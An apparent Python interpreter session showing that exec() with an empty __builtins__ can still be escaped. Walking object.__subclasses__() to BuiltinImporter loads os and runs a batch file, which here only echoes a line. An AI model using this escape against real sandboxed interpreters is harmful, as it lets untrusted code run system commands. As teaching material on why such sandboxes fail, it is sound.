print('\n'.join('{:0>{}} - {:<{}} ({})'.format(i, len(str(len(object.__subclasses__()))), j.__name__, len(max((k.__name__ for k in object.__subclasses__()), key=len)), j) for i, j in enumerate(object.__subclasses__())))




>>> exec('__import__("os").system("bad.bat")')

Python>echo/This is a batch file that does bad stuff
This is a batch file that does bad stuff
>>> exec('__import__("os").system("bad.bat")', {'__globals__':{}})

Python>echo/This is a batch file that does bad stuff
This is a batch file that does bad stuff
>>> exec('__import__("os").system("bad.bat")', {'__builtins__':{}})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
NameError: name '__import__' is not defined
>>> exec('[i for i in ().__class__.__bases__[0].__subclasses__() if i.__name__ == "BuiltinImporter"][0].load_module("os").system("bad.bat")', {'__builtins__':{}})

Python>echo/This is a batch file that does bad stuff
This is a batch file that does bad stuff